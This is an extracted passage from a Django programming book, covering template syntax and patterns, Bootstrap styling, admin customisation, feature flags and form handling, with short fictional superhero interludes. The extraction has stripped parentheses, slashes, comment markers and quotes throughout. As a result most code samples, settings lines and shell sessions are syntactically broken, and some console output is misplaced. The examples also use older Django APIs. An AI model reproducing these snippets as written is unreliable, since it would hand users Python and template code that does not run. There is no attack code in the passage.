'SUPER'      Its Django template equivalent:  {{ titleupperslice:':5' }}"  Tags Programming languages can do more than just display variables. Django's template  language has many familiar syntactic forms, such as if and for. They should be  written in the tag syntax such as {% if %}. Several template-specific forms, such   as include and block are also written in the tag syntax.     Run the following command in Python:  >>> if 1==1:   Date is 31-08-2014      Its corresponding Django template form:  ...     print " Date is {0} ".format time.strftime "%d-%m-%Y"     {% if 1 == 1 %} Date is {% now 'd-m-Y' %} {% endif %}  [ 577 ]  Chapter 5   Philosophy – don't invent a programming  language A common question among beginners is how to perform numeric computations   such as finding percentages in templates. As a design philosophy, the template  system does not intentionally allow the following:     Assignment to variables    Advanced logic  This decision was made to prevent you from adding business logic in templates.  From our experience with PHP or ASP-like languages, mixing logic with  presentation can be a maintenance nightmare. However, you can write custom  template tags  which will be covered shortly  to perform any computation,   especially if it is presentation-related.  Best Practice Keep business logic out of your templates.  Organizing templates The default project layout created by the startproject command does not define  a location for your templates. This is very easy to fix. Create a directory named  templates in your project's root directory. Add the TEMPLATE_DIRS variable in   your settings.py:  BASE_DIR = os.path.dirname os.path.dirname __file__   TEMPLATE_DIRS = [os.path.join BASE_DIR, 'templates' ]  That's all. For example, you can add a template called about.html and refer to it   in the  urls.py file as follows:  urlpatterns = patterns      '',     url r'^about $', TemplateView.as_view template_name='about.html' ,         name='about' ,  Your templates can also reside within your apps. Creating a templates directory  inside your app directory is ideal to store your app-specific templates.  [ 578 ]  Templates   Here are some good practices to organize your templates:     Keep all app-specific templates inside the app's template directory within a  separate directory, for example, projroot app templates app template. html—notice how app appears twice in the path     Use the .html extension for your templates    Prefix an underscore for templates, which are snippets to be included,    for example, _navbar.html  Support for other template languages From Django 1.8 onward, multiple template engines will be supported. There   will be built-in support for the Django template language  the standard template  language discussed earlier  and Jinja2. In many benchmarks, Jinja2 is quite faster  than Django templates.  It is expected that there will be an additional TEMPLATES setting for specifying the  template engine and all template-related settings. The TEMPLATE_DIRS setting will   be soon deprecated.  Madame O For the first time in weeks, Steve's office corner was bustling with frenetic  activity. With more recruits, the now five-member team comprised of  Brad, Evan, Jacob, Sue, and Steve. Like a superhero team, their abilities  were deep and amazingly well-balanced. Brad and Evan were the coding gurus. While Evan was obsessed over  details, Brad was the big-picture guy. Jacob's talent in finding corner cases  made him perfect for testing. Sue was in charge of marketing and design. In fact, the entire design was supposed to be done by an avant-garde  design agency. It took them a month to produce an abstract, vivid,  color-splashed concept loved by the management. It took them another  two weeks to produce an HTML-ready version from their Photoshop  mockups. However, it was eventually discarded as it proved to be  sluggish and awkward on mobile devices. Disappointed by the failure of what was now widely dubbed as the  "unicorn vomit" design, Steve felt stuck. Hart had phoned him quite  concerned about the lack of any visible progress to show management.   In a grim tone, he reminded Steve, "We have already eaten up the   project's buffer time. We cannot afford any last-minute surprises." It was then that Sue, who had been unusually quiet since she joined,  mentioned that she had been working on a mockup using Twitter's  Bootstrap. Sue was the growth hacker in the team—a keen coder and   a creative marketer.  [ 579 ]  Chapter 5   She admitted having just rudimentary HTML skills. However, her  mockup was surprisingly thorough and looked familiar to users of other  contemporary social networks. Most importantly, it was responsive and  worked perfectly on every device from tablets to mobiles. The management unanimously agreed on Sue's design, except for  someone named Madame O. One Friday afternoon, she stormed into  Sue's cabin and began questioning everything from the background  color to the size of the mouse cursor. Sue tried to explain to her with  surprising poise and calm. An hour later, when Steve decided to intervene, Madame O was arguing  why the profile pictures must be in a circle rather than square. "But a   site-wide change like that will never get over in time," he said. Madame  O shifted her gaze to him and gave him a sly smile. Suddenly, Steve felt a  wave of happiness and hope surge within him. It felt immensely reliving  and stimulating. He heard himself happily agreeing to all she wanted. Later, Steve learnt that Madame Optimism was a minor mentalist who  could influence prone minds. His team loved to bring up the latter fact  on the slightest occasion.  Using Bootstrap Hardly anyone starts an entire website from scratch these days. CSS frameworks  such as Twitter's Bootstrap or Zurb's Foundation are easy starting points with grid  systems, great typography, and preset styles. Most of them use responsive web  design, making your site mobile friendly.  A website using vanilla Bootstrap Version 3.0.2 built using the Edge project skeleton  [ 580 ]  Templates   We will be using Bootstrap, but the steps will be similar for other CSS frameworks.  There are three ways to include Bootstrap in your website:     Find a project skeleton: If you have not yet started your project, then finding   a project skeleton that already has Bootstrap is a great option. A project  skeleton such as edge  created by yours truly  can be used as the initial  structure while running startproject as follows: $ django-admin.py startproject --template=https:  github.com  arocks edge archive master.zip --extension=py,md,html myproj  Alternatively, you can use one of the cookiecutter templates with   support for Bootstrap.     Use a package: The easiest option if you have already started your   project is to use a package, such as django-frontend-skeleton or   django-bootstrap-toolkit.     Manually copy: None of the preceding options guarantees that their version  of Bootstrap is the latest one. Bootstrap releases are so frequent that package  authors have a hard time keeping their files up to date. So, if you would like  to work with the latest version of Bootstrap, the best option is to download  it from http:  getbootstrap.com yourself. Be sure to read the release  notes to check whether your templates need to be changed due to backward  incompatibility.  Copy the dist directory that contains the css, js, and fonts directories into  your project root under the static directory. Ensure that this path is set for  STATICFILES_DIRS in your settings.py:  STATICFILES_DIRS = [os.path.join BASE_DIR, "static" ]  Now you can include the Bootstrap assets in your templates, as follows:  {% load staticfiles %}         <link href="{% static 'css bootstrap.min.css' %}"  rel="stylesheet">  But they all look the same! Bootstrap might be a great way to get started quickly. However, sometimes,  developers get lazy and do not bother to change the default look. This leaves a   poor impression on your users who might find your site's appearance a little too  familiar and uninteresting.  [ 581 ]  Chapter 5   Bootstrap comes with plenty of options to improve its visual appeal. There is a file  called variables.less that contains several variables from the primary brand color  to the default font, as follows:  @brand-primary:         428bca; @brand-success:         5cb85c; @brand-info:            5bc0de; @brand-warning:         f0ad4e; @brand-danger:          d9534f;  @font-family-sans-serif:  "Helvetica Neue", Helvetica, Arial, sans- serif; @font-family-serif:       Georgia, "Times New Roman", Times, serif; @font-family-monospace:   Menlo, Monaco, Consolas, "Courier New",  monospace; @font-family-base:        @font-family-sans-serif;  Bootstrap documentation explains how you can set up the build system  including  the LESS compiler  to compile these files down to the style sheets. Or quite  conveniently, you can visit the 'Customize' area of the Bootstrap site to generate   your customized style sheet online.  Thanks to the huge community around Bootstrap, there are also several sites, such   as bootswatch.com, which have themed style sheets, that are drop-in replacements  for your bootstrap.min.css.  Another approach is to override the Bootstrap styles. This is recommended if you find  upgrading your customized Bootstrap style sheet between Bootstrap versions to be  quite tedious. In this approach, you can add your site-wide styles in a separate CSS    or LESS  file and include it after the standard Bootstrap style sheet. Thus, you can  simply upgrade the Bootstrap file with minimal changes to your site-wide style sheet.  Last but not the least, you can make your CSS classes more meaningful by   replacing structural names, such as 'row' or 'column-md-4', with 'wrapper'   or 'sidebar'. You can do this with a few lines of LESS code, as follows:  .wrapper {   .make-row  ; } .sidebar {   .make-md-column 4 ; }  This is possible due to a feature called mixins  sounds familiar? . With the Less  source files, Bootstrap can be completely customized to your needs.  [ 582 ]  Templates   Template patterns Django's template language is quite simple. However, you can save a lot of time by  following some elegant template design patterns. Let's take a look at some of them.  Pattern – template inheritance tree Problem: Templates have lots of repeated content in several pages. Solution: Use template inheritance wherever possible and include snippets elsewhere.  Problem details Users expect pages of a website to follow a consistent structure. Certain interface  elements, such as navigation menu, headers, and footers are seen in most web  applications. However, it is cumbersome to repeat them in every template.  Most templating languages have an include mechanism. The contents of another   file, possibly a template, can be included at the position where it is invoked. This   can get tedious in a large project.  The sequence of the snippets to be included in every template would be mostly the  same. The ordering is important and hard to check for mistakes. Ideally, we should  be able to create a 'base' structure. New pages ought to extend this base to specify  only the changes or make extensions to the base content.  Solution details Django templates have a powerful extension mechanism. Similar to classes in  programming, a template can be extended through inheritance. However, for   that to work, the base itself must be structured into blocks as follows:  [ 583 ]  Chapter 5   The base.html template is, by convention, the base structure for the entire site.   This template will usually be well-formed HTML  that is, with a preamble and  matching closing tags  that has several placeholders marked with the {% block  tags %} tag. For example, a minimal base.html file looks like the following:       {% block heading %}Untitled{% endblock %}  {% block content %} {% endblock %}      There are two blocks here, heading and content, that can be overridden. You can  extend the base to create specific pages that can override these blocks. For example,  here is an about page:  {% extends "base.html" %} {% block content %}   This is a simple About page   {% endblock %} {% block heading %}About{% endblock %}  Notice that we do not have to repeat the structure. We can also mention the blocks  in any order. The rendered result will have the right blocks in the right places as  defined in base.html.  If the inheriting template does not override a block, then its parent's contents are  used. In the preceding example, if the about template does not have a heading,   then it will have the default heading of 'Untitled'.  The inheriting template can be further inherited forming an inheritance chain.   This pattern can be used to create a common derived base for pages with a certain  layout, for example, single-column layout. A common base template can also be  created for a section of the site, for example, blog pages.  Usually, all inheritance chains can be traced back to a common root, base.html;  hence, the pattern's name—Template inheritance tree. Of course, this need not   be strictly followed. The error pages 404.html and 500.html are usually not  inherited and stripped bare of most tags to prevent further errors.  [ 584 ]  Templates   Pattern – the active link Problem: The navigation bar is a common component in most pages. However,   the active link needs to reflect the current page the user is on. Solution: Conditionally, change the active link markup by setting context variables  or based on the request path.  Problem details The naïve way to implement the active link in a navigation bar is to manually set   it in every page. However, this is neither DRY nor foolproof.  Solution details There are several solutions to determine the active link. Excluding JavaScript-based  approaches, they can be mainly grouped into template-only and custom   tag-based solutions. A template-only solution By mentioning an active_link variable while including the snippet of the  navigation template, this solution is both simple and easy to implement.  In every template, you will need to include the following line  or inherit it :  {% include "_navbar.html" with active_link='link2' %}  The _navbar.html file contains the navigation menu with a set of checks for the  active link variable:  { _navbar.html }      <a  href="{% url 'link1' %}">Link 1      <a  href="{% url 'link2' %}">Link 2      <a  href="{% url 'link3' %}">Link 3      [ 585 ]  Chapter 5   Custom tags Django templates offer a versatile set of built-in tags. It is quite easy to create your  own custom tag. Since custom tags live inside an app, create a templatetags  directory inside an app. This directory must be a package, so it should have an   empty  __init__.py file.  Next, write your custom template in an appropriately named Python file. For  example, for this active link pattern, we can create a file called nav.py with the  following contents:   app templatetags nav.py from django.core.urlresolvers import resolve from django.template import Library  register = Library   @register.simple_tag def active_nav request, url :     url_name = resolve request.path .url_name     if url_name == url:         return "active"     return ""  This file defines a custom tag named active_nav. It retrieves the URL's path  component from the request argument  say,  about —see Chapter 4, Views and   URLs, for a detailed explanation of the URL path . Then, the resolve   function  is used to lookup the URL pattern's name  as defined in urls.py  from the path.  Finally, it returns the string "active" only when the pattern's name matches the  expected pattern name.  The syntax for calling this custom tag in a template is {% active_nav request  'pattern_name' %}. Notice that the request needs to be passed in every page   this tag is used.  Including a variable in several views can get cumbersome. Instead, we add a   built-in context processor to TEMPLATE_CONTEXT_PROCESSORS in settings.py so  that the request will be present in a request variable across the site, as follows:   settings.py from django.conf import global_settings TEMPLATE_CONTEXT_PROCESSORS = \     global_settings.TEMPLATE_CONTEXT_PROCESSORS +           'django.core.context_processors.request',        [ 586 ]  Templates   Now, all that remains is to use this custom tag in your template to set the active  attribute:  { base.html } {% load nav %}      <a href="{% url  'active1' %}">Active 1      <a href="{% url  'active2' %}">Active 2      <a href="{% url  'active3' %}">Active 3      Summary In this chapter, we looked at the features of Django's template language. Since it  is easy to change the templating language in Django, many people might consider  replacing it. However, it is important to learn the design philosophy of the built-in  template language before we seek alternatives.  In the next chapter, we will look into one of the killer features of Django, that is,   the admin interface, and how we can customize it.  [ 587 ]  Chapter 5    Admin Interface  In this chapter, we will discuss the following topics:     Customizing admin    Enhancing models for the admin    Admin best practices    Feature flags  Django's much discussed admin interface makes it stand apart from the competition.  It is a built-in app that automatically generates a user interface to add and modify   a site's content. For many, the admin is Django's killer app,  automating the boring  task of creating admin interfaces for the models in your project.  Admin enables your team to add content and continue development at the same  time. Once your models are ready and migrations have been applied, you just need  to add a line or two to create its admin interface. Let's see how.  Using the admin interface In Django 1.7, the admin interface is enabled by default. After creating your project,  you will be able to see a login page when you navigate to http:  127.0.0.1:8000  admin .  [ 589 ]   If you enter the superuser credentials  or credentials of any staff user , you will be  logged into the admin interface, as shown in the following screenshot:  However, your models will not be visible here, unless you define a corresponding  ModelAdmin class. This is usually defined in your app's admin.py as follows:  from django.contrib import admin from . import models  admin.site.register models.SuperHero   Here, the second argument to register, a ModelAdmin class, has been omitted. Hence,  we will get a default admin interface for the Post model. Let's see how to create and  customize this ModelAdmin class.  [ 590 ]  Admin Interface   The Beacon "Having coffee?" asked a voice from the corner of the pantry. Sue almost  spilled her coffee. A tall man wearing a tight red and blue colored  costume stood smiling with hands on his hips. The logo emblazoned on  his chest said in large type—Captain Obvious. "Oh, my god," said Sue as she wiped the coffee stain with a napkin.  "Sorry, I think I scared you," said Captain Obvious "What is the  emergency?" "Isn't it obvious that she doesn't know?" said a calm feminine voice from  above. Sue looked up to find a shadowy figure slowly descend from the  open hall. Her face was partially obscured by her dark matted hair that  had a few grey streaks. "Hi Hexa!" said the Captain "But then, what was  the message on SuperBook about?" Soon, they were all at Steve's office staring at his screen. "See, I told you  there is no beacon on the front page," said Evan. "We are still developing  that feature." "Wait," said Steve. "Let me login through a non-staff  account." In a few seconds, the page refreshed and an animated red beacon  prominently appeared at the top. "That's the beacon I was talking about!"  exclaimed Captain Obvious. "Hang on a minute," said Steve. He pulled  up the source files for the new features deployed earlier that day. A  glance at the beacon feature branch code made it clear what went wrong:      if switch_is_active request, 'beacon'  and not  request.user.is_staff  :          Display the beacon  "Sorry everyone," said Steve. "There has been a logic error. Instead of  turning this feature on only for staff, we inadvertently turned it on for  everyone but staff. It is turned off now. Apologies for any confusion." "So, there was no emergency?" said Captain with a disappointed look.  Hexa put an arm on his shoulder and said "I am afraid not, Captain."  Suddenly, there was a loud crash and everyone ran to the hallway. A man  had apparently landed in the office through one of the floor-to-ceiling  glass walls. Shaking off shards of broken glass, he stood up. "Sorry, I  came as fast as I could," he said, "Am I late to the party?" Hexa laughed.  "No, Blitz. Been waiting for you to join," she said.  [ 591 ]  Chapter 6   Enhancing models for the admin The admin app is clever enough to figure out a lot of things from your model  automatically. However, sometimes the inferred information can be improved.   This usually involves adding an attribute or a method to the model itself    rather than at the ModelAdmin class .  Let's first take a look at an example that enhances the model for better presentation,  including the admin interface:   models.py class SuperHero models.Model :     name = models.CharField max_length=100      added_on = models.DateTimeField auto_now_add=True       def __str__ self :         return "{0} - {1:%Y-%m-%d %H:%M:%S}".format self.name,                                                     self.added_on       def get_absolute_url self :         return reverse 'superhero.views.details', args=[self.id]       class Meta:         ordering = ["-added_on"]         verbose_name = "superhero"         verbose_name_plural = "superheroes"  Let's take a look at how admin uses all these non-field attributes:     __str__  : Without this, the list of superhero entries would look extremely   boring. Every entry would be plainly shown as <SuperHero: SuperHero  object>. Try to include the object's unique information in its str  representation  or unicode representation, in the case of Python 2.x code ,  such as its name or version. Anything that helps the admin to recognize the  object unambiguously would help.     get_absolute_url  : This attribute is handy if you like to switch between  the admin view and the object's detail view on your website. If this method   is defined, then a button labelled "View on site" will appear in the top   right-hand side of the object's edit page in its admin page.  [ 592 ]  Admin Interface      ordering: Without this meta option, your entries can appear in any order as  returned from the database. As you can imagine, this is no fun for the admins  if you have a large number of objects. Fresh entries are usually preferred to  be seen first, so sorting by date in the reverse chronological order is common.     verbose_name: If you omit this attribute, your model's name would be   converted from CamelCase into camel case. In this case, "super hero" would  look awkward, so it is better to be explicit about how you would like the  user-readable name to appear in the admin interface.     verbose_name_plural: Again, omitting this option can leave you with   funny results. Since Django simply prepends an 's' to the word, the plural   of a superhero would be shown as "superheros"  on the admin front page,   no less . So, it is better to define it correctly here.  It is recommended that you define the previous Meta attributes and methods, not  just for the admin interface, but also for better representation in the shell, log files,  and so on.  Of course, a further improved representation within the admin is possible by  creating a ModelAdmin class as follows:   admin.py class SuperHeroAdmin admin.ModelAdmin :     list_display =  'name', 'added_on'      search_fields = ["name"]     ordering = ["name"]  admin.site.register models.SuperHero, SuperHeroAdmin   Let's take a look at these options more closely:     list_display: This option shows the model instances in a tabular form.  Instead of using the model's __str__ representation, it shows each field  mentioned as a separate sortable column. This is ideal if you like to see more  than one attribute of your model.     search_fields: This option shows a search box above the list. Any search  term entered would be searched against the mentioned fields. Hence, only  text fields such as CharField or TextField can be mentioned here.  [ 593 ]  Chapter 6      ordering: This option takes precedence over your model's default ordering.   It is useful if you prefer a different ordering in your admin screen.  Enhancing a model's admin page  The preceding screenshot shows the following insets:            Inset 1: Without str or Meta attributes Inset 2: With enhanced model meta attributes Inset 3: With customized ModelAdmin  [ 594 ]  Admin Interface   Here, we have only mentioned a subset of commonly used admin options. Certain  kinds of sites use the admin interface heavily. In such cases, it is highly recommended  that you go through and understand the admin part of the Django documentation.  Not everyone should be an admin Since admin interfaces are so easy to create, people tend to misuse them. Some   give early users admin access by merely turning on their 'staff' flag. Soon such  users begin making feature requests, mistaking the admin interface to be the actual  application interface.  Unfortunately, this is not what the admin interface is for. As the flag suggests,   it is an internal tool for the staff to enter content. It is production-ready but not   really intended for the end users of your website.  It is best to use admin for simple data entry. For example, in a project I had reviewed,  every teacher was made an admin for a Django application managing university  courses. This was a poor decision since the admin interface confused the teachers.  The workflow for scheduling a class involves checking the schedules of other  teachers and students. Using the admin interface gives them a direct view of the  database. There is very little control over how the data gets modified by the admin.  So, keep the set of people with admin access as small as possible. Make changes via  admin sparingly, unless it is simple data entry such as adding an article's content.  Best Practice Don't give admin access to end users.  Ensure that all your admins understand the data inconsistencies that can arise   from making changes through the admin. If possible, record manually or use apps,  such as django-audit-loglog that can keep a log of admin changes made for  future reference.  In the case of the university example, we created a separate interface for teachers,  such as a course builder. These tools will be visible and accessible only if the user   has a teacher profile.  Essentially, rectifying most misuses of the admin interface involves creating more  powerful tools for certain sets of users. However, don't take the easy  and wrong   path of granting them admin access.  [ 595 ]  Chapter 6   Admin interface customizations The out-of-box admin interface is quite useful to get started. Unfortunately, most  people assume that it is quite hard to change the Django admin and leave it as it is.  In fact, the admin is extremely customizable and its appearance can be drastically  changed with minimal effort.  Changing the heading Many users of the admin interface might be stumped by the heading—Django  administration. It might be more helpful to change this to something customized   such as MySite admin or something cool such as SuperBook Secret Area. It is quite easy to make this change. Simply add this line to your site's urls.py:  admin.site.site_header = "SuperBook Secret Area"  Changing the base and stylesheets Almost every admin page is extended from a common base template named   admin base_site.html. This means that with a little knowledge of HTML and   CSS, you can make all sorts of customizations to change the look and feel of the   admin interface.  Simply create a directory called admin in any templates directory. Then, copy the  base_site.html file from the Django source directory and alter it according to your  needs. If you don't know where the templates are located, just run the following   commands within the Django shell:  >>> from os.path import join  >>> from django.contrib import admin  >>> print join admin.__path__[0], "templates", "admin"     home arun env sbenv lib python3.4 site-packages django contrib admin  templates admin  The last line is the location of all your admin templates. You can override or extend  any of these templates. Please refer to the next section for an example of extending  the template.  [ 596 ]  Admin Interface   For an example of customizing the admin base template, you can change the font  of the entire admin interface to "Special Elite" from Google Fonts, which is great for  giving a mock-serious look. You will need to add an admin base_site.html file in  one of your template's directories with the following contents:  {% extends "admin base.html" %}  {% block extrastyle %}     <link href='http:  fonts.googleapis.com css?family=Special+Elite'  rel='stylesheet' type='text css'>            body, td, th, input {        font-family: 'Special Elite', cursive;      }       {% endblock %}  This adds an extra stylesheet for overriding the font-related styles and will be  applied to every admin page.  Adding a Rich Text Editor for WYSIWYG editing Sometimes, you will need to include JavaScript code in the admin interface.   A common requirement is to use an HTML editor such as CKEditor for   your TextField.  There are several ways to implement this in Django, for example, using a Media  inner class on your ModelAdmin class. However, I find extending the admin   change_form template to be the most convenient approach.  For example, if you have an app called Posts, then you will need to create a file  called change_form.html within the templates admin posts  directory. If you  need to show CKEditor  could be any JavaScript editor for that matter, but this one   is the one I prefer  for the message field of any model in this app, then the contents  of the file can be as follows:  {% extends "admin change_form.html" %}  {% block footer %}   {{ block.super }}    <  script>  [ 597 ]  Chapter 6          CKEDITOR.replace "id_message", {      toolbar: [      [ 'Bold', 'Italic', '-', 'NumberedList', 'BulletedList'],],      width: 600,    } ;            .cke { clear: both; }     {% endblock %}  The highlighted part is the automatically created ID for the form element we wish to  enhance from a normal textbox to a Rich Text Editor. These scripts and styles have  been added to the footer block so that the form elements would be created in the  DOM before they are changed.  Bootstrap-themed admin Overall, the admin interface is quite well designed. However, it was designed in  2006 and, for the most part, looks that way too. It doesn't have a mobile UI or other  niceties that have become standard today.  Unsurprisingly, the most common request for admin customization is whether   it can be integrated with Bootstrap. There are several packages that can do this,   such as django-admin-bootstrapped or djangosuit.  Rather than overriding all the admin templates yourself, these packages provide  ready-to-use Bootstrap-themed templates. They are easy to install and deploy.   Being based on Bootstrap, they are responsive and come with a variety of widgets  and components.  Complete overhauls There have been attempts made to completely reimagine the admin interface too.  Grappelli is a very popular skin that extends the Django admin with new features,  such as autocomplete lookups and collapsible inlines. With django-admin-tools,  you get a customizable dashboard and menu bar.  There have been attempts made to completely rewrite the admin, such as   django-admin2 and nexus, which did not gain any significant adoption. There  is even an official proposal called AdminNext to revamp the entire admin app.  Considering the size, complexity, and popularity of the existing admin, any such  effort is expected to take a significant amount of time.  [ 598 ]  Admin Interface   Protecting the admin The admin interface of your site gives access to almost every piece of data stored.  So, don't leave the metaphorical gate lightly guarded. In fact, one of the only telltale  signs that someone runs Django is that, when you navigate to http:  example. com admin , you will be greeted by the blue login screen.  In production, it is recommended that you change this location to something less  obvious. It is as simple as changing this line in your root urls.py:      url r'^secretarea ', include admin.site.urls  ,  A slightly more sophisticated approach is to use a dummy admin site at the default  location or a honeypot  see the django-admin-honeypot package . However, the  best option is to use HTTPS for your admin area since normal HTTP will send all   the data in plaintext over the network.  Check your web server documentation on how to set up HTTPS for admin requests.  On Nginx, it is quite easy to set this up and involves specifying the SSL certificate  locations. Finally, redirect all HTTP requests for admin pages to HTTPS, and you   can sleep more peacefully.  The following pattern is not strictly limited to the admin interface but it is  nonetheless included in this chapter, as it is often controlled in the admin.  Pattern – feature flags Problem: Publishing of new features to users and deployment of the corresponding  code in production should be independent. Solution: Use feature flags to selectively enable or disable features after deployment.  Problem details Rolling out frequent bug fixes and new features to production is common today.  Many of these changes are unnoticed by users. However, new features that have  significant impact in terms of usability or performance ought to be rolled out in a  phased manner. In other words, deployment should be decoupled from a release.  Simplistic release processes activate new features as soon as they are deployed.   This can potentially have catastrophic results ranging from user issues  swamping  your support resources  to performance issues  causing downtime .  [ 599 ]  Chapter 6   Hence, in large sites it is important to decouple deployment of new features in  production and activate them. Even if they are activated, they are sometimes seen  only by a select group of users. This select group can be staff or a sample set of  customers for trial purposes.  Solution details Many sites control the activation of new features using Feature Flags. A feature flag  is a switch in your code that determines whether a feature should be made available  to certain customers.  Several Django packages provide feature flags such as gargoyle and django-waffle.  These packages store feature flags of a site in the database. They can be activated or  deactivated through the admin interface or through management commands. Hence,  every environment  production, testing, development, and so on  can have its own   set of activated features.  Feature flags were originally documented, as used in Flickr  See http:  code. flickr.net 2009 12 02 flipping-out  . They managed a code repository  without any branches, that is, everything was checked into the mainline. They   also deployed this code into production several times a day. If they found out   that a new feature broke anything in production or increased load on the database,  then they simply disabled it by turning that feature flag off.  Feature flags can be used for various other situations  the following examples use  django-waffle :     Trials: A feature flag can also be conditionally active for certain users.   These can be your own staff or certain early adopters than you may be  targeting as follows:     def my_view request :         if flag_is_active request, 'flag_name' :              Behavior if flag is active.  Sites can run several such trials in parallel, so different sets of users might  actually have different user experiences. Metrics and feedback are collected  from such controlled tests before wider deployment.  [ 600 ]  Admin Interface      A B testing: This is quite similar to trials except that users are selected  randomly within a controlled experiment. This is quite common in web  design to identify which changes can increase the conversion rates.   This is how such a view can be written:     def my_view request :         if sample_is_active request, 'design_name' :              Behavior for test sample.     Performance testing: Sometimes, it is hard to measure the impact of a feature   on server performance. In such cases, it is best to activate the flag only for a  small percentage of users first. The percentage of activations can be gradually  increased if the performance is within the expected limits.     Limit externalities: We can also use feature flags as a site-wide feature   switch that reflects the availability of its services. For example, downtime in  external services such as Amazon S3 can result in users facing error messages  while they perform actions, such as uploading photos. When the external service is down for extended periods, a feature flag can  be deactivated that would disable the upload button and or show a more  helpful message about the downtime. This simple feature saves the user's  time and provides a better user experience:      def my_view request :         if switch_is_active 's3_down' :              Disable uploads and show it is downtime  The main disadvantage of this approach is that the code gets littered with  conditional checks. However, this can be controlled by periodic code  cleanups that remove checks for fully accepted features and prune out  permanently deactivated features.  Summary In this chapter, we explored Django's built-in admin app. We found that it is not   only quite useful out of the box, but that various customizations can also be done   to improve its appearance and functionality.  In the next chapter, we will take a look at how to use forms more effectively in  Django by considering various patterns and common use cases.  [ 601 ]  Chapter 6    Forms  In this chapter, we will discuss the following topics:     Form workflow    Untrusted input    Form processing with class-based views    Working with CRUD views  Let's set aside Django Forms and talk about web forms in general. Forms are   not just long, boring pages with several items that you have to fill. Forms are  everywhere. We use them every day. Forms power everything from Google's   search box to Facebook's Like button. Django abstracts most of the grunt work while working with forms such as validation  or presentation. It also implements various security best practices. However, forms are  also common sources of confusion due to one of several states they could be in. Let's  examine them more closely.  How forms work Forms can be tricky to understand because interacting with them takes more than  one request-response cycle. In the simplest scenario, you need to present an empty  form, and the user fills it correctly and submits it. In other cases, they enter some  invalid data and the form needs to be resubmitted until the entire form is valid.  So, a form goes through several states:     Empty form: This form is called an unbound form in Django    Filled form: This form is called a bound form in Django  [ 603 ]      Submitted form with errors: This form is called a bound form but    not a valid form     Submitted form without errors: This form is called a bound and valid form  Note that the users will never see the form in the last state. They don't have to.  Submitting a valid form should take the users to a success page.  Forms in Django Django's form class contains the state of each field and, by summarizing them up   a level, of the form itself. The form has two important state attributes, which are   as follows:     is_bound: If this returns false, then it is an unbound form, that is, a fresh  form with empty or default field values. If true, then the form is bound,   that is, at least one field has been set with a user input.     is_valid  : If this returns true, then every field in the bound form has   valid data. If false, then there was some invalid data in at least one field   or the form was not bound.  For example, imagine that you need a simple form that accepts a user's name and  age. The form class can be defined as follows:   forms.py from django import forms  class PersonDetailsForm forms.Form :     name = forms.CharField max_length=100      age = forms.IntegerField    This class can be initiated in a bound or unbound manner, as shown in the   following code:  >>> f = PersonDetailsForm    >>> print f.as_p       Name:  <input id="id_name" maxlength="100"  name="name" type="text"  >     Age:  <input id="id_age" name="age"  type="number"  >   >>> f.is_bound  [ 604 ]  Forms   >>> g = PersonDetailsForm {"name": "Blitz", "age": "30"}   >>> print g.as_p       Name:  <input id="id_name" maxlength="100"  name="name" type="text" value="Blitz"  >     Age:  <input id="id_age" name="age"  type="number" value="30"  >    False  >>> g.is_bound   True  Notice how the HTML representation changes to include the value attributes with  the bound data in them.  Forms can be bound only when you create the form object, that is, in the constructor.  How does the user input end up in a dictionary-like object that contains values for  each form field?  To find this out, you need to understand how a user interacts with a form. In the  following diagram, a user opens the person's details form, fills it incorrectly first,  submits it, and then resubmits it with the valid information:  [ 605 ]  Chapter 7   As shown in the preceding diagram, when the user submits the form, the view  callable gets all the form data inside request.POST  an instance of QueryDict .   The form gets initialized with this dictionary-like object—referred to this way   since it behaves like a dictionary and has a bit of extra functionality.  Forms can be defined to send the form data in two different ways: GET or POST.  Forms defined with METHOD="GET" send the form data encoded in the URL itself,   for example, when you submit a Google search, your URL will have your form input,  that is, the search string visibly embedded, such as ?q=Cat+Pictures. The GET  method is used for idempotent forms, which do not make any lasting changes to   the state of the world  or to be more pedantic, processing the form multiple times   has the same effect as processing it once . For most cases, this means that it is used  only to retrieve data.  However, the vast majority of the forms are defined with METHOD="POST". In this  case, the form data is sent along with the body of the HTTP request, and they are  not seen by the user. They are used for anything that involves a side effect, such as  storing or updating data.  Depending on the type of form you have defined, the view will receive the form   data in request.GET or request.POST, when the user submits the form. As  mentioned earlier, either of them will be like a dictionary. So, you can pass it to   your form class constructor to get a bound form object.  The Breach Steve was curled up and snoring heavily in his large three-seater  couch. For the last few weeks, he had been spending more than 12  hours at the office, and tonight was no exception. His phone lying on  the carpet beeped. At first, he said something incoherently, still deep  in sleep. Then, it beeped again and again, in increasing urgency. By the fifth beep, Steve awoke with a start. He frantically searched  all over his couch, and finally located his phone. The screen showed  a brightly colored bar chart. Every bar seemed to touch the high line  except one. He pulled out his laptop and logged into the SuperBook  server. The site was up and none of the logs indicated any unusual  activity. However, the external services didn't look that good. The phone at the other end seemed to ring for eternity until a croaky  voice answered, "Hello, Steve?" Half an hour later, Jacob was able to  zero down the problem to an unresponsive superhero verification  service. "Isn't that running on Sauron?" asked Steve. There was a brief  hesitation. "I am afraid so," replied Jacob.  [ 606 ]  Forms   Steve had a sinking feeling at the pit of his stomach. Sauron, a  mainframe application, was their first line of defense against   cyber-attacks and other kinds of possible attack. It was three in   the morning when he alerted the mission control team. Jacob kept  chatting with him the whole time. He was running every available  diagnostic tool. There was no sign of any security breach. Steve tried to calm him down. He reassured him that perhaps it was a  temporary overload and he should get some rest. However, he knew  that Jacob wouldn't stop until he found what's wrong. He also knew  that it was not typical of Sauron to have a temporary overload. Feeling  extremely exhausted, he slipped back to sleep. Next morning, as Steve hurried to his office building holding a bagel,  he heard a deafening roar. He turned and looked up to see a massive  spaceship looming towards him. Instinctively, he ducked behind a  hedge. On the other side, he could hear several heavy metallic objects  clanging onto the ground. Just then his cell phone rang. It was Jacob.  Something had moved closer to him. As Steve looked up, he saw a  nearly 10-foot-tall robot, colored orange and black, pointing what  looked like a weapon directly down at him. His phone was still ringing. He darted out into the open barely missing  the sputtering shower of bullets around him. He took the call. "Hey  Steve, guess what, I found out what actually happened." "I am dying to  know," Steve quipped. "Remember, we had used UserHoller's form widget to collect customer  feedback? Apparently, their data was not that clean. I mean several  serious exploits. Hey, there is a lot of background noise. Is that the TV?"  Steve dived towards a large sign that said "Safe Assembly Point". "Just  ignore that. Tell me what happened," he screamed. "Okay. So, when our admin opened their feedback page, his laptop must  have gotten infected. The worm could reach other systems he has access  to, specifically, Sauron. I must say Jacob, this is a very targeted attack.  Someone who knows our security system quite well has designed this. I  have a feeling something scary is coming our way." Across the lawn, a robot picked up an SUV and hurled it towards Steve.  He raised his hands and shut his eyes. The spinning mass of metal froze  a few feet above him. "Important call?" asked 